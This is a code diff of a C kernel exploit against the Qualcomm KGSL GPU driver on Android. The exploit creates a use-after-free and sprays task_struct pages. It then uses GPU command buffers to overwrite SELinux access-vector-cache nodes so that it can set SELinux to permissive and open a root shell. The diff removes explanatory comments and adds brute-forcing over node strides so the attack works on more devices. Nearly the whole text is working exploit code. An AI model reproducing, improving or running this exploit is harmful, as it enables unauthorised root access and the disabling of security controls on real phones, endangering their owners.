@@ -1,5 +1,3 @@
-
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -72,7 +70,6 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* sauce と同一の定数 (Phase 1-3) */
 #define UAF_ADDR  0x7001ff000ULL
 #define UAF_SIZE  0x10004000ULL
 #define OVERLAP_ADDR 0x7001fe000ULL
@@ -82,22 +79,29 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-/* AVC flip 定数 (DWARF 検証済み) */
 #define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
-#define AVC_NODE_STRIDE  72
-#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
-#define AVC_PAGES_PER_IB 12
-#define AVC_LOOP_SECONDS 150
-
+#define AVC_PAGES_PER_IB 6
+#define AVC_LOOP_PER_STRIDE 30
 #define SPRAY_PIDS 2000
-#define CHURN_MAX_PATHS 4096
+#define CHURN_MAX_PATHS 20000
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static uint64_t alloc_flags = 0;
 static int uaf_id = -1, ph_id = -1;
 
-/* ============ KGSL 基本操作 (sauce と同パターン) ============ */
+static char churn_paths[CHURN_MAX_PATHS][160];
+static int churn_npaths = 0;
+static int churn_built = 0;
+
+static const char *churn_dirs[] = {
+    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
+    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
+    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
+    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
+    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
+    "/dev", "/proc",
+};
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
@@ -172,8 +176,6 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ============ Phase A1-A4: 自前 UAF 作成 (sauce Phase 1-4 移植) ============ */
-
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
@@ -241,21 +243,6 @@ static void phase4_reclaim(void) {
     usleep(10000);
 }
 
-/* ============ チャーン (AVC miss 生成) ============ */
-
-static const char *churn_dirs[] = {
-    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
-    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
-    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
-    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
-    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
-    "/dev", "/proc",
-};
-#define CHURN_MAX_PATHS 20000
-static char churn_paths[CHURN_MAX_PATHS][160];
-static int churn_npaths = 0;
-static int churn_built = 0;
-
 static void churn_walk(const char *dir, int depth) {
     if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
     DIR *d = opendir(dir);
@@ -318,7 +305,6 @@ static int avc_entries(void) {
     return e;
 }
 
-/* setenforce 0: 書き込み成功 (flip 成功 or 既に permissive) で 1 */
 static int try_setenforce0(void) {
     int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
     if (fd < 0) return 0;
@@ -327,9 +313,6 @@ static int try_setenforce0(void) {
     return (w == 1);
 }
 
-/* ============ GPU スキャン + flip ============ */
-
-/* UAF 範囲の全ページから TASKUAF!! comm を含む task_struct ページを記録 */
 #define PRE_SCAN_DWORDS 560
 #define PRE_PAGES_PER_IB 4
 static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
@@ -378,28 +361,29 @@ static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return n;
 }
 
-/* (tsid==2 && tclass==1 && allowed bit7==0) の avc_node を allowed|=0x80 で flip */
 static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                            void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                           uint64_t *vas, int npages, int verbose) {
+                           uint64_t *vas, int npages, int stride, int verbose) {
     uint32_t *cmd = (uint32_t *)ib_m;
     uint32_t *data = (uint32_t *)dst_m;
     int total_flips = 0, idx = 0;
     unsigned int ts;
+    int nodes_per_page = 4096 / stride;
+    if (nodes_per_page == 0) return 0;
 
     while (idx < npages) {
         int batch = npages - idx;
         if (batch > AVC_PAGES_PER_IB) batch = AVC_PAGES_PER_IB;
-        int node_dws = batch * AVC_NODES_PER_PAGE * 4;
+        int node_dws = batch * nodes_per_page * 4;
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, node_dws * 4);
         int dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
         for (int p = 0; p < batch; p++) {
             uint64_t va = vas[idx + p];
-            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
-                uint64_t node_va = va + n * AVC_NODE_STRIDE;
-                uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4;
+            for (int n = 0; n < nodes_per_page; n++) {
+                uint64_t node_va = va + n * stride;
+                uint32_t dofs = (p * nodes_per_page + n) * 4;
                 for (int w = 0; w < 4; w++) {
                     uint32_t dl, dh, sl, sh;
                     split64(dst_ga + (dofs + w) * 4, &dl, &dh);
@@ -421,12 +405,10 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         fcmd[fdw++] = cp_type7(CP_NOP, 0);
         for (int p = 0; p < batch; p++) {
             uint64_t va = vas[idx + p];
-            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
-                uint32_t *nd = &data[(p * AVC_NODES_PER_PAGE + n) * 4];
-                /* 本物の AVC ノード判定: ssid は実在レンジ(1..0x3fff)、tsid==2 (SECURITY)、tclass==1。
-                   allowed を全ビット許容(0xFFFFFFFF)に書き換え、churn での置換後も効くようにする。 */
+            for (int n = 0; n < nodes_per_page; n++) {
+                uint32_t *nd = &data[(p * nodes_per_page + n) * 4];
                 if (nd[0] >= 1 && nd[0] <= 0x3fff && nd[1] == 2 && nd[2] == 1) {
-                    uint64_t node_va = va + n * AVC_NODE_STRIDE + 0xc;
+                    uint64_t node_va = va + n * stride + 0xc;
                     uint32_t sl, sh;
                     split64(node_va, &sl, &sh);
                     fcmd[fdw++] = cp_type7(CP_MEM_WRITE, 4);
@@ -435,8 +417,8 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                     fcmd[fdw++] = 0;
                     nb_flips++;
                     if (verbose)
-                        printf("[FLIP] va=0x%lx+0x%x sid=0x%x ts=0x%x allowed->0xffffffff\n",
-                            (unsigned long)va, n * AVC_NODE_STRIDE + 0xc,
+                        printf("[FLIP] stride=%d va=0x%lx+0x%x sid=0x%x ts=0x%x allowed->0xffffffff\n",
+                            stride, (unsigned long)va, n * stride + 0xc,
                             nd[0], nd[1]);
                 }
             }
@@ -452,8 +434,6 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     }
     return total_flips;
 }
-
-/* ============ task_struct spray (UAF ページ保持) ============ */
 
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
@@ -482,7 +462,6 @@ static void kill_spray_children(void) {
     printf("[KILL] %d spray children killed+reaped\n", killed);
 }
 
-/* ルートシェル (xh 互換) */
 static void root_shell(void) {
     printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
     fflush(stdout);
@@ -499,7 +478,54 @@ static void root_shell(void) {
     printf("[-] Root shell exited\n");
 }
 
-/* ============ main ============ */
+static int run_stride(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
+                      void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
+                      uint64_t *task_pgs, int n_task_pgs, int stride) {
+    int flip_total = 0;
+    int ok = 0;
+    uint64_t t_start = time(NULL);
+    uint64_t t_last_report = t_start;
+    printf("[*] Trying stride=%d for %d seconds\n", stride, AVC_LOOP_PER_STRIDE);
+    while (!ok && time(NULL) - t_start < AVC_LOOP_PER_STRIDE) {
+        int f1 = 0, f2 = 0;
+        for (int i = n_task_pgs - 1; i >= 0; i -= AVC_PAGES_PER_IB) {
+            int batch = (i + 1) >= AVC_PAGES_PER_IB ? AVC_PAGES_PER_IB : (i + 1);
+            f1 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
+                                  &task_pgs[i - batch + 1], batch, stride, 1);
+            if (try_setenforce0()) { ok = 1; break; }
+        }
+        if (!ok) {
+            for (uint64_t va = UAF_ADDR + 0x2000;
+                 va < UAF_ADDR + UAF_SIZE - 0x1000;
+                 va += AVC_PAGES_PER_IB * 0x1000) {
+                uint64_t vas[AVC_PAGES_PER_IB];
+                int nb = 0;
+                for (int i = 0; i < AVC_PAGES_PER_IB &&
+                     va + (uint64_t)i * 0x1000 < UAF_ADDR + UAF_SIZE - 0x1000; i++)
+                    vas[nb++] = va + (uint64_t)i * 0x1000;
+                f2 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
+                                      vas, nb, stride, 1);
+                if (try_setenforce0()) { ok = 1; break; }
+            }
+        }
+        flip_total += f1 + f2;
+        if (!ok) {
+            churn_round();
+            if (avc_entries() >= 0)
+                printf("[AVC] entries=%d\n", avc_entries());
+            if (try_setenforce0()) ok = 1;
+        }
+        if (time(NULL) - t_last_report >= 5) {
+            printf("[*] stride=%d t=%lus flips=%d ok=%d\n",
+                stride, (unsigned long)(time(NULL) - t_start), flip_total, ok);
+            t_last_report = time(NULL);
+        }
+    }
+    if (ok) {
+        printf("[+] stride=%d succeeded\n", stride);
+    }
+    return ok;
+}
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
@@ -517,7 +543,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    /* ===== 自前 UAF 作成 ===== */
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
@@ -534,7 +559,6 @@ int main(int argc, char **argv) {
     printf("[*] Phase 4: Reclaim\n");
     phase4_reclaim();
 
-    /* ===== spray: UAF ページを task_struct で保持 ===== */
     spawn_spray();
 
     unsigned int ctx_id = create_context();
@@ -552,7 +576,6 @@ int main(int argc, char **argv) {
 
     printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);
 
-    /* UAF 写像の健全性チェック: 先頭 1KB の非ゼロ dword 数 (task_struct が載っていれば非ゼロ) */
     {
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
@@ -581,65 +604,32 @@ int main(int argc, char **argv) {
             nz > 0 ? "(UAF alive)" : "(UAF looks empty)");
     }
 
-    /* 1. プリスキャン: TASKUAF!! ページ記録 (kill 前に実施) */
     uint64_t task_pgs[4096];
     int n_task_pgs = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
         UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
     printf("[*] pre-scan: %d task pages\n", n_task_pgs);
 
-    /* 2. spray 子を kill (UAF ページを unmovable free として buddy へ) */
     kill_spray_children();
-    usleep(100000);   /* 空 slab の buddy 返却待ち (直後に新 slab = タスクページ) */
-    /* freelist を消費させ、以降の新 slab をタスクページに強制する */
+    usleep(100000);
+
     churn_build();
     for (int c = 0; c < 3; c++) churn_round();
     printf("[AVC] entries=%d (post-churn)\n", avc_entries());
 
-    /* 3. フリップループ (最長 AVC_LOOP_SECONDS) */
-    int flip_total = 0;
+    int strides[] = {
+        8, 16, 24, 32, 40, 48, 56, 64, 72, 80, 88, 96, 104, 112, 120, 128
+    };
+    int num_strides = sizeof(strides)/sizeof(strides[0]);
     int ok = 0;
-    uint64_t t_start = time(NULL);
-    uint64_t t_last_report = t_start;
-    while (!ok && time(NULL) - t_start < AVC_LOOP_SECONDS) {
-        int f1 = 0, f2 = 0;
-        for (int i = n_task_pgs - 1; i >= 0; i -= AVC_PAGES_PER_IB) {
-            int batch = (i + 1) >= AVC_PAGES_PER_IB ? AVC_PAGES_PER_IB : (i + 1);
-            f1 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
-                                  &task_pgs[i - batch + 1], batch, 1);
-            if (try_setenforce0()) { ok = 1; break; }
-        }
-        if (!ok) {
-            for (uint64_t va = UAF_ADDR + 0x2000;
-                 va < UAF_ADDR + UAF_SIZE - 0x1000;
-                 va += AVC_PAGES_PER_IB * 0x1000) {
-                uint64_t vas[AVC_PAGES_PER_IB];
-                int nb = 0;
-                for (int i = 0; i < AVC_PAGES_PER_IB &&
-                     va + (uint64_t)i * 0x1000 < UAF_ADDR + UAF_SIZE - 0x1000; i++)
-                    vas[nb++] = va + (uint64_t)i * 0x1000;
-                f2 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
-                                      vas, nb, 1);
-                if (try_setenforce0()) { ok = 1; break; }
-            }
-        }
-        flip_total += f1 + f2;
-        if (!ok) {
-            churn_round();
-            if (avc_entries() >= 0)
-                printf("[AVC] entries=%d\n", avc_entries());
-            if (try_setenforce0()) ok = 1;
-        }
-        if (time(NULL) - t_last_report >= 5) {
-            printf("[*] t=%lus flips=%d ok=%d\n",
-                (unsigned long)(time(NULL) - t_start), flip_total, ok);
-            t_last_report = time(NULL);
-        }
+    for (int si = 0; si < num_strides && !ok; si++) {
+        ok = run_stride(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
+                        task_pgs, n_task_pgs, strides[si]);
     }
 
     if (ok) {
         printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
     } else {
-        printf("[-] AVC bypass failed (flips=%d, 90s timeout)\n", flip_total);
+        printf("[-] AVC bypass failed with all strides\n");
     }
     {
         int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
